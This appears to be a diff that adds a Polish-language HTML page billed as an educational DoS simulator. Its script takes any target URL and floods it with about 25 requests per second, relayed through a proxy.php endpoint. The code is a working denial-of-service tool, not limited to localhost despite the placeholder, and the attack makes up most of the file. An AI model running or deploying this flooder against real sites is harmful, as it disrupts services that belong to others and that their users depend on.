@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <title>Symulacja DoS przez Proxy</title>
+  <style>
+    body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
+    input, button { padding: 10px; font-size: 16px; margin: 5px 0; }
+    #log { background: #222; padding: 10px; height: 200px; overflow-y: scroll; font-family: monospace; }
+  </style>
+</head>
+<body>
+  <h1>Symulator DoS przez Proxy (Edukacja)</h1>
+  <input type="text" id="target" placeholder="http://localhost:3000" size="50">
+  <br>
+  <button onclick="startAttack()">Start</button>
+  <button onclick="stopAttack()">Stop</button>
+  <div id="log"></div>
+
+  <script>
+    let intervalId = null;
+    let counter = 0;
+
+    function log(msg) {
+      const logBox = document.getElementById("log");
+      logBox.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    function startAttack() {
+      const target = document.getElementById("target").value.trim();
+      if (!target) return alert("Podaj adres celu!");
+
+      counter = 0;
+      log("Rozpoczynam atak na: " + target);
+
+      intervalId = setInterval(() => {
+        for (let i = 0; i < 5; i++) {
+          fetch(`proxy.php?url=${encodeURIComponent(target)}`)
+            .then(() => log(`Wysłano żądanie #${++counter}`))
+            .catch(() => log(`Błąd żądania #${++counter}`));
+        }
+      }, 200);
+    }
+
+    function stopAttack() {
+      clearInterval(intervalId);
+      intervalId = null;
+      log("Zatrzymano atak.");
+    }
+  </script>
+</body>
+</html>
